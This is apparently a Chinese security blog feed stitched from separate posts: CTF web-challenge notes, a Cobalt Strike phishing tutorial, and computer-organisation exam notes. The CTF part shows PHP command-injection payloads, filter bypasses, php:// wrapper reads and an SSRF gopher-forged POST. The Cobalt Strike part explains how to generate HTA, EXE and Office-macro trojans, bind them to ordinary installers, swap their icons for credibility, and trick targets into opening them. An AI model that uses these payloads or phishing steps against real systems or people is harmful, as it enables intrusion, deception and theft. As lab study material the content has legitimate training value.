<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//查看上一级的目录</span><br><span class="line">cmd=system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure>

<p>发现flag文件</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905162352302.png" alt="image-20230905162352302"></p>
<p>使用cat命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=system(&quot;cat /flag_21985&quot;);</span><br></pre></td></tr></table></figure>

<p>查看到flag的具体内容</p>
<h3 id="2-文件包含"><a href="#2-文件包含" class="headerlink" title="2. 文件包含"></a>2. 文件包含</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164534416.png" alt="image-20230905164534416"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164602319.png" alt="image-20230905164602319"></p>
<p>拿到题目，可以发现，我们在执行的时候可以将某个文件包含运行，这里明显要求将shell.txt的文件包含一起执行</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164723651.png" alt="image-20230905164723651"></p>
<p>成功执行代码</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164802046.png" alt="image-20230905164802046"></p>
<p>使用蚁剑连接，当然，使用system命令查看一个也是可以的，然后可以拿到flag</p>
<h3 id="3-php-x2F-x2F-input"><a href="#3-php-x2F-x2F-input" class="headerlink" title="3. php:&#x2F;&#x2F;input"></a>3. php:&#x2F;&#x2F;input</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912103927339.png" alt="image-20230912103927339"></p>
<p>查看题目，可以发现题目没有给我们任何的有eval执行的shell文件了，但是，其留下了一个php:&#x2F;&#x2F;命令，可以使用php:&#x2F;&#x2F;input命令将我们想执行的代码传上去。</p>
<p>php:&#x2F;&#x2F;input命令是一个php的命令输入流，其会将我们的代码以post的形式传到服务器，换句话说，php:&#x2F;&#x2F;input能接收我们写在post中的代码，并传输到服务器端。</p>
<h3 id="4-源代码读取"><a href="#4-源代码读取" class="headerlink" title="4. 源代码读取"></a>4. 源代码读取</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912111214367.png" alt="image-20230912111214367"></p>
<p>fla在flag中，直接进行访问，使用php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;[文件名]即可。</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112103953.png" alt="image-20230912112103953"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112120798-16955380701701.png" alt="image-20230912112120798"></p>
<h3 id="5-远程包含"><a href="#5-远程包含" class="headerlink" title="5. 远程包含"></a>5. 远程包含</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112714652.png" alt="image-20230912112714652"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112742766.png" alt="image-20230912112742766"></p>
<p>发现包含include，查看phpinfo，发现开启了allow_url_fopen和allow_url_include，也就是开启了远程包含</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912114803016.png" alt="image-20230912114803016"></p>
<p>使用php:&#x2F;&#x2F;input将命令上传执行。</p>
<h3 id="6-命令注入-无过滤"><a href="#6-命令注入-无过滤" class="headerlink" title="6. 命令注入-无过滤"></a>6. 命令注入-无过滤</h3><p>两个命令的分隔：</p>
<p>1、每个命令之间用(分号)”;”隔开；<br>说明:各命令的执行结果，不会影响其他命令的。<br>意思是说每个命令都会执行，但不保证每个命令都执行成功。<br>2、每个命令之间用&amp;&amp;隔开<br>说明：若前面的命令执行成功，才会去执行后面的命令。这样的话，可以保证所有的命令执行完毕后，执行的过程都是成功的。<br>3、每个命令之间用||隔开<br>说明：||是或的意思，只有前面的命令执行失败后采取执行下一条命令，直到执行成功一条命令为止。<br>4、|是管道符号。管道符号改变标准输入的源或者是标准输出的目的地。<br>5、&amp;是后台任务符号。后台任务符号使shell在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作。</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913094235230.png" alt="image-20230913094235230"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913094431205.png" alt="image-20230913094431205"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913104311058.png" alt="image-20230913104311058"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913104359762.png" alt="image-20230913104359762"></p>
<p>直接使用Linux的命令进行查看</p>
<h3 id="7-命令注入-cat过滤"><a href="#7-命令注入-cat过滤" class="headerlink" title="7. 命令注入-cat过滤"></a>7. 命令注入-cat过滤</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913141710717.png" alt="image-20230913141710717"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913141928238.png" alt="image-20230913141928238"></p>
<p>将cat命令过滤了，可以使用其他的查看命令</p>
<p>当cat被过滤后,可以使用一下命令进行读取文件的内容<br>(1)more:一页一页的显示的显示档案内容<br>(2)less:与more类似,但是比more更好的是,他可以[pg dn][pg up]翻页<br>(3)head:查看头几行<br>(4)tac:从最后一行开始显示,可以看出tac是cat的反向显示<br>(5)tail:查看尾几行<br>(6)nl:显示的时候,顺便输出行号<br>(7)od:以二进制的方式读取档案内容<br>(8)vi:一种编辑器，这个也可以查看<br>(9)vim:一种编辑器,这个也可以查看<br>(10)sort:可以查看<br>(11)uniq:可以查看<br>(12)file -f:报错出具体的内容</p>
<h3 id="8-命令注入-过滤空格"><a href="#8-命令注入-过滤空格" class="headerlink" title="8. 命令注入-过滤空格"></a>8. 命令注入-过滤空格</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913142247986.png" alt="image-20230913142247986"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913142601768.png" alt="image-20230913142601768"></p>
<h3 id="9-命令注入-过滤目录分隔符"><a href="#9-命令注入-过滤目录分隔符" class="headerlink" title="9. 命令注入-过滤目录分隔符"></a>9. 命令注入-过滤目录分隔符</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913143918669.png" alt="image-20230913143918669"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913144015186.png" alt="image-20230913144015186"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913144137007.png" alt="image-20230913144137007"></p>
<h3 id="10-命令注入-过滤运算符"><a href="#10-命令注入-过滤运算符" class="headerlink" title="10. 命令注入-过滤运算符"></a>10. 命令注入-过滤运算符</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913145850858.png" alt="image-20230913145850858"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913145952945.png" alt="image-20230913145952945"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151042475.png" alt="image-20230913151042475"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151535192.png" alt="image-20230913151535192"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151718585.png" alt="image-20230913151718585"></p>
<h1 id="6-SSRF"><a href="#6-SSRF" class="headerlink" title="6. SSRF"></a>6. SSRF</h1><h3 id="1-内网访问"><a href="#1-内网访问" class="headerlink" title="1. 内网访问"></a>1. 内网访问</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913201824609.png" alt="image-20230913201824609"></p>
<h3 id="2-伪协议读取文件"><a href="#2-伪协议读取文件" class="headerlink" title="2. 伪协议读取文件"></a>2. 伪协议读取文件</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913204053560.png" alt="image-20230913204053560"></p>
<h3 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3. 端口扫描"></a>3. 端口扫描</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205211049.png" alt="image-20230913205211049"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205255854.png" alt="image-20230913205255854"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205530535-16955381276002.png" alt="image-20230913205530535"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205740556.png" alt="image-20230913205740556"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205803285.png" alt="image-20230913205803285"></p>
<h3 id="4-POST请求"><a href="#4-POST请求" class="headerlink" title="4. POST请求"></a>4. POST请求</h3><p>写在题目前：</p>
<p>302跳转的302是http状态码</p>
<p>表示请求的网页自请求的网页移动到了新的位置，搜索引擎索引中保存原来的URL</p>
<p>这里可以通过访问302.php，并且传参gopher来伪造本地访问</p>
<p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。随着HTTP协议的壮大，Gopher协议已经慢慢的淡出了我们的视线，但是Gopher协议很多组件都支持并且可以做很多事，在SSRF中，Gopher协议</p>
<p>可以对FTP、Telnet、Redis、Memcache、mysql进行攻击,也可以发送GET、POST 请求。</p>
<p>那么Gopher协议需要如何构造妮？</p>
<p>其实这个协议和http协议很类似，只不过gopher协议没有默认端口，需要特殊指定，而且需要指定POST方法，回车换行需要使用%0d%0a,而且POST参数之间的&amp;分隔符也需要URL编码</p>
<p>我们来看看Gopher协议的基本协议格式</p>
<p>gopher:&#x2F;&#x2F;:&#x2F;_后接TCP数据流</p>
<p>这里直接写伪造的gopher协议</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">key<span class="operator">=</span>d<span class="number">93819</span><span class="keyword">c</span><span class="number">4</span><span class="keyword">c</span><span class="number">1</span>a<span class="number">18</span>dc<span class="number">606</span>dc<span class="number">5</span><span class="keyword">c</span><span class="number">6486</span>f<span class="number">77227</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917104920370.png" alt="image-20230917104920370"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105031724.png" alt="image-20230917105031724"></p>
<p>访问flag.php，会发现其给了一个上传框，并且给了一个key。</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105323709.png" alt="image-20230917105323709"></p>
<p>使用上传框传数据，但是却提示只能从本地访问。那我们可以使用gopher协议冒充本地访问</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105537086.png" alt="image-20230917105537086"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105714104.png" alt="image-20230917105714104"></p>
<p>使用gopher构造，具体结构如图，注意，Content-Length的长度应当与key的长度相同，否则不能访问。</p>
<h3 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5. 文件上传"></a>5. 文件上传</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230918134059991.png" alt="image-20230918134059991"><br><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230918134028668.png" alt="image-20230918134028668"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/</url>
    <content><![CDATA[<p>title: 木马钓鱼<br>date: ‎2023-7‎-‎14‎ 19:32:23<br>tags: [Cobalt Strike, 木马钓鱼]<br>categories: [木马钓鱼]</p>
<h3 id="1-Cobalt-Strike的安装和使用"><a href="#1-Cobalt-Strike的安装和使用" class="headerlink" title="1. Cobalt Strike的安装和使用"></a>1. Cobalt Strike的安装和使用</h3><p>Cobalt Strike是一款美国Red Team开发的<a href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>神器，常被业界人称为CS。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，<a href="https://so.csdn.net/so/search?q=socket&spm=1001.2101.3001.7020">socket</a>代理，office攻击，文件捆绑，钓鱼等功能。服务端是一个，客户端可以有多个，团队可进行分布式协团操作。，使用之前要自己先配置好java的环境。</p>
<span id="more"></span>

<h4 id="1-项目框架"><a href="#1-项目框架" class="headerlink" title="1. 项目框架"></a>1. 项目框架</h4><p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712210115247.png" alt="image-20230712210115247"></p>
<p><a href="https://pan.baidu.com/s/1-jIOqdOYVRVqc5Za9bl8sA">下载地址</a>  提取码：t7in</p>
<p>· agscript：扩展应用的脚本</p>
<p>· c2lint：用于检查profile的错误和异常</p>
<p>· teamserver：服务器端启动程序</p>
<p>· cobaltstrike.jar：CobaltStrike核心程序</p>
<p>· cobaltstrike.auth：用于客户端和服务器端认证的文件，客户端和服务端有一个一模一样的</p>
<p>· cobaltstrike.store：秘钥证书存放文件</p>
<p>一些目录作用如下：</p>
<p>· data：用于保存当前TeamServer的一些数据</p>
<p>· download：用于存放在目标机器下载的数据</p>
<p>· upload：上传文件的目录</p>
<p>· logs：日志文件，包括Web日志、Beacon日志、截图日志、下载日志、键盘记录日志等</p>
<p>· third-party：第三方工具目录</p>
<h4 id="2-工具的使用"><a href="#2-工具的使用" class="headerlink" title="2. 工具的使用"></a>2. 工具的使用</h4><p>将源文件下载下来后，将文件可以复制到kali中，我选择在kali上启动服务端，Windows系统上启动客户端</p>
<h5 id="1-服务端启动"><a href="#1-服务端启动" class="headerlink" title="1. 服务端启动"></a>1. 服务端启动</h5><p>​		进入源文件目录</p>
<p>​		chmod 777 teamserver</p>
<p>​		运行：.&#x2F;teamserver &lt;你的Ip&gt;&lt;登录该服务器的密码&gt;</p>
<p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712210743984.png" alt="image-20230712210743984"></p>
<h5 id="2-客户端启动"><a href="#2-客户端启动" class="headerlink" title="2.客户端启动"></a>2.客户端启动</h5><p>​		进入源文件目录</p>
<p>​		双击start.bat文件</p>
<p>​		连接：用户名随便取</p>
<p>​		<img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712211319446.png" alt="image-20230712211319446"></p>
<h4 id="3-参数详情"><a href="#3-参数详情" class="headerlink" title="3. 参数详情"></a>3. 参数详情</h4><h5 id="1-Cobalt-Strik"><a href="#1-Cobalt-Strik" class="headerlink" title="1. Cobalt Strik"></a>1. Cobalt Strik</h5><p>New Connection # 新建连接，支持连接多个服务器端<br>Preferences # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录<br>Visualization # 主要展示输出结果的视图<br>VPN Interfaces # 设置VPN接口<br>Listenrs # 创建监听器<br>Script Manager # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等<br>Close # 退出连接</p>
<h5 id="2-View"><a href="#2-View" class="headerlink" title="2. View"></a>2. View</h5><p>Applications # 显示受害主机的应用信息<br>Credentials # 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz<br>Downloads # 查看已下载文件<br>Event Log # 主机上线记录以及团队协作聊天记录<br>Keystrokes # 查看键盘记录结果<br>Proxy Pivots # 查看代理模块<br>Screenshots # 查看所有屏幕截图<br>Script Console # 加载第三方脚本以增强功能<br>Targets # 显示所有受害主机<br>Web Log # 所有Web服务的日志</p>
<h5 id="3-Attacks"><a href="#3-Attacks" class="headerlink" title="3. Attacks"></a>3. Attacks</h5><h6 id="Packages"><a href="#Packages" class="headerlink" title="Packages"></a>Packages</h6><p>HTML Application # 生成(executable&#x2F;VBA&#x2F;powershell)这三种原理实现的恶意HTA木马文件<br>MS Office Macro # 生成office宏病毒文件<br>Payload Generator # 生成各种语言版本的payload<br>USB&#x2F;CD AutoPlay # 生成利用自动播放运行的木马文件<br>Windows Dropper # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)<br>Windows Executable # 生成可执行exe木马<br>Windows Executable(Stageless) # 生成无状态的可执行exe木马</p>
<h6 id="Web-Drive-by"><a href="#Web-Drive-by" class="headerlink" title="Web Drive-by"></a>Web Drive-by</h6><p>Manage # 对开启的web服务进行管理<br>Clone Site # 克隆网站，可以记录受害者提交的数据<br>Host File # 提供文件下载，可以选择Mime类型<br>Scripted Web Delivery # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery<br>Signed Applet Attack # 使用java自签名的程序进行钓鱼攻击(该方法已过时)<br>Smart Applet Attack # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)<br>System Profiler # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等</p>
<h6 id="Spear-Phish"><a href="#Spear-Phish" class="headerlink" title="Spear Phish"></a>Spear Phish</h6><p>鱼叉钓鱼邮件</p>
<h5 id="4-Reporting"><a href="#4-Reporting" class="headerlink" title="4. Reporting"></a>4. Reporting</h5><p>Activity Report # 活动报告<br>Hosts Report # 主机报告<br>Indicators of Compromise # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes<br>Sessions Report # 会话报告<br>Social Engineering Report # 社会工程报告：包括鱼叉钓鱼邮件及点击记录<br>Tactics, Techniques, and Procedures # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略<br>Reset Data # 重置数据<br>Export Data # 导出数据，导出.tsv文件格式</p>
<h4 id="4-工具栏"><a href="#4-工具栏" class="headerlink" title="4. 工具栏"></a>4. 工具栏</h4><p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712211824750.png" alt="image-20230712211824750"></p>
<h3 id="2-Cobalt-Strike的简介"><a href="#2-Cobalt-Strike的简介" class="headerlink" title="2. Cobalt Strike的简介"></a>2. Cobalt Strike的简介</h3><h4 id="1-创建监听器"><a href="#1-创建监听器" class="headerlink" title="1. 创建监听器"></a>1. 创建监听器</h4><p>两种监听器</p>
<ul>
<li>内部：Beacon，自己使用的；包括dns、http、https、smb四种方式的监听器</li>
<li>外部：Fooreign，常常需要联合其他工具使用，配合Metasploit或者Armitage的监听器。</li>
</ul>
<p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712213001170.png" alt="image-20230712213001170"></p>
<p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712213115853.png" alt="image-20230712213115853"></p>
<h4 id="2-生成木马文件并远程控制"><a href="#2-生成木马文件并远程控制" class="headerlink" title="2. 生成木马文件并远程控制"></a>2. 生成木马文件并远程控制</h4><p>Attacks有几种，如下：</p>
<p>· HTML Application 　　　　　　 生成一个恶意HTML Application木马，后缀格式为 .hta。通过HTML调用其他语 言的应用组件进行攻击，提供了 可执行文件、PowerShell、VBA三种方法。</p>
<p>· MS Office Macro 　　　　　　 生成office宏病毒文件；</p>
<p>· Payload Generator 　　　　　 生成各种语言版本的payload，可以生成基于C、C#、COM Scriptlet、Java、Perl、 PowerShell、Python、Ruby、VBA等的payload</p>
<p>· Windows Executable 　　　　　生成32位或64位的exe和基于服务的exe、DLL等后门程序</p>
<p>· Windows Executable(S)　　　　用于生成一个exe可执行文件，其中包含Beacon的完整payload，不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存</p>
<h5 id="1）HTML-Application"><a href="#1）HTML-Application" class="headerlink" title="1）HTML Application"></a>1）HTML Application</h5><p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712220250955.png" alt="image-20230712220250955"></p>
<p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712220341345.png" alt="image-20230712220341345"></p>
<p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712220418741.png" alt="image-20230712220418741"></p>
<p>放在f盘保存</p>
<p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712220457091.png" alt="image-20230712220457091"></p>
<p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712220611172.png" alt="image-20230712220611172"></p>
<p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712220630660.png" alt="image-20230712220630660"></p>
<p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230712220719708.png" alt="image-20230712220719708"></p>
<p>靶机拉取上面的木马文件，被留后门</p>
<p>然后连接靶机，先sleep 0，将心跳变为0，使得cmd命令可以立即执行。执行cmd命令时要在命令的前面加上shell </p>
<p>然后就为所欲为吧</p>
<h5 id="2）Windows-Executable（s）"><a href="#2）Windows-Executable（s）" class="headerlink" title="2）Windows Executable（s）"></a>2）Windows Executable（s）</h5><p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230713151237194.png" alt="image-20230713151237194"></p>
<p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230713151328464.png" alt="image-20230713151328464"></p>
<p>选择端口号后生成木马</p>
<p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230713151507928.png" alt="image-20230713151507928"></p>
<p>将木马程序与普通安装程序压缩在一起</p>
<p><img src="/2023/10/13/%E6%9C%A8%E9%A9%AC%E9%92%93%E9%B1%BC/image-20230713151605895.png" alt="image-20230713151605895"></p>
<p>进行相关配置，生成一个新的程序，生成的程序可以使用图标替换工具进行图标的替换，增加真实性和迷惑性</p>
<h5 id="3）office宏病毒"><a href="#3）office宏病毒" class="headerlink" title="3）office宏病毒"></a>3）office宏病毒</h5><p>打开正常的office文件，比如test.docx</p>
<p>视图-》宏-》查看宏</p>
<p>选择宏的位置为当前的文档-》输入宏名称-》创建</p>
<p>copy Macro粘贴到宏命令处</p>
<p>选否，另存为docm文件</p>
<p>诱导靶机点击文件并打开宏</p>
]]></content>
  </entry>
  <entry>
    <title>计组复习</title>
    <url>/2023/06/26/%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h1><h3 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h3><hr>
<h3 id="1-2-计算机组件"><a href="#1-2-计算机组件" class="headerlink" title="1.2 计算机组件"></a>1.2 计算机组件</h3><h4 id="1）软硬件对等原则"><a href="#1）软硬件对等原则" class="headerlink" title="1）软硬件对等原则"></a>1）软硬件对等原则</h4><h4 id="2）计算机三大件"><a href="#2）计算机三大件" class="headerlink" title="2）计算机三大件"></a>2）计算机三大件</h4><ul>
<li>CPU</li>
<li>内存</li>
<li>I&#x2F;O</li>
</ul>
<span id="more"></span>	

<h4 id="3）计量单位"><a href="#3）计量单位" class="headerlink" title="3）计量单位"></a>3）计量单位</h4><ul>
<li>K M G T P E Z Y（10到80，2）</li>
<li>1MHz &#x3D; 1 000 000 Hz</li>
<li>1KB &#x3D; 1024 bytes 1MB 1GB</li>
<li>m μ n p f a z y（-3到-24）</li>
</ul>
<hr>
<h3 id="1-3-计算机系统实例"><a href="#1-3-计算机系统实例" class="headerlink" title="1.3 计算机系统实例"></a>1.3 计算机系统实例</h3><ul>
<li><p>硬盘驱动访问时间大概在ms级别，内存访问在ns级别，芯片电路大概在μm级别，</p>
</li>
<li><p>SATA(serial advanced technology attachment)：串行高级技术配置</p>
</li>
<li><p>serial ports</p>
</li>
<li><p>parallel ports</p>
</li>
<li><p>USB</p>
</li>
<li><p>PCI</p>
</li>
<li><p>NIC</p>
</li>
</ul>
<hr>
<h3 id="1-4-标准化组织"><a href="#1-4-标准化组织" class="headerlink" title="1.4 标准化组织"></a>1.4 标准化组织</h3><ul>
<li>ISO</li>
<li>IEEE</li>
<li>ITU</li>
</ul>
<h3 id="1-5-发展历程"><a href="#1-5-发展历程" class="headerlink" title="1.5 发展历程"></a>1.5 发展历程</h3><ul>
<li>0 机械：计算钟，帕斯卡林，差分机，穿孔制表</li>
<li>1 真空管：ENIAC，IBM-650</li>
<li>2 晶体管</li>
<li>3 集成电路</li>
<li>4 超大规模集成电路</li>
</ul>
<p>摩尔定律</p>
<p>洛克定律</p>
<h3 id="1-6-计算机层次结构"><a href="#1-6-计算机层次结构" class="headerlink" title="1.6 计算机层次结构"></a>1.6 计算机层次结构</h3><ul>
<li>6 用户</li>
<li>5 高级语言层</li>
<li>4 汇编语言层</li>
<li>3 系统软件层</li>
<li>2 机器层（ISA）</li>
<li>1 控制层（硬连线和微程序）</li>
<li>0 数字逻辑层</li>
</ul>
<h3 id="1-7-云计算"><a href="#1-7-云计算" class="headerlink" title="1.7 云计算"></a>1.7 云计算</h3><ul>
<li>基础设施即服务（IaaS）</li>
<li>平台即服务（PaaS）</li>
<li>软件即服务（SaaS）</li>
</ul>
<h3 id="1-8-Von-Neumann-Model"><a href="#1-8-Von-Neumann-Model" class="headerlink" title="1.8 Von Neumann Model"></a>1.8 Von Neumann Model</h3><p>冯诺伊曼模型</p>
<ul>
<li>CPU:ALU,control unit, pc and registers</li>
<li>内存</li>
<li>I&#x2F;O</li>
</ul>
<p>冯洛伊曼瓶颈</p>
<p>冯洛伊曼周期：取指 译码 执行</p>
<p>冯洛伊曼模型扩展：总线扩展</p>
<h3 id="1-9-非冯洛伊曼模型"><a href="#1-9-非冯洛伊曼模型" class="headerlink" title="1.9 非冯洛伊曼模型"></a>1.9 非冯洛伊曼模型</h3><p>哈佛架构</p>
<p>神经网络，细胞自动机，认知计算机，量子计算，数据流计算，并行计算机</p>
<h1 id="第二章-计算机中的数据表示"><a href="#第二章-计算机中的数据表示" class="headerlink" title="第二章 计算机中的数据表示"></a>第二章 计算机中的数据表示</h1><h3 id="2-1-数据表示"><a href="#2-1-数据表示" class="headerlink" title="2.1 数据表示"></a>2.1 数据表示</h3><p>比特 字节 字 双字 半字节 </p>
<h3 id="2-2-按位计数系统"><a href="#2-2-按位计数系统" class="headerlink" title="2.2 按位计数系统"></a>2.2 按位计数系统</h3><p>successful subtraction method（逐次递减法）</p>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622101929640.png" alt="image-20230622101929640"></p>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622102624498.png" alt="image-20230622102624498"></p>
<p>division reminder method（除留余数法）</p>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622102049547.png" alt="image-20230622102049547"></p>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622102653132.png" alt="image-20230622102653132"></p>
<h3 id="2-3-有符号整数的表示"><a href="#2-3-有符号整数的表示" class="headerlink" title="2.3 有符号整数的表示"></a>2.3 有符号整数的表示</h3><p>最左一位的比特为符号位（1为负）</p>
<p>反码表示（one’s complement）</p>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622103232725.png" alt="image-20230622103232725"></p>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622103245010.png" alt="image-20230622103245010"></p>
<p>补码表示（two’s complement）:grin:补码加一</p>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622103443459.png" alt="image-20230622103443459"></p>
<p>总结</p>
<p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622103530493.png" alt="image-20230622103530493"></p>
<h3 id="2-4-浮点数的表示"><a href="#2-4-浮点数的表示" class="headerlink" title="2.4 浮点数的表示"></a>2.4 浮点数的表示</h3><p><img src="/2023/06/26/%E5%A4%8D%E4%B9%A0/image-20230622103931109.png" alt="image-20230622103931109"></p>
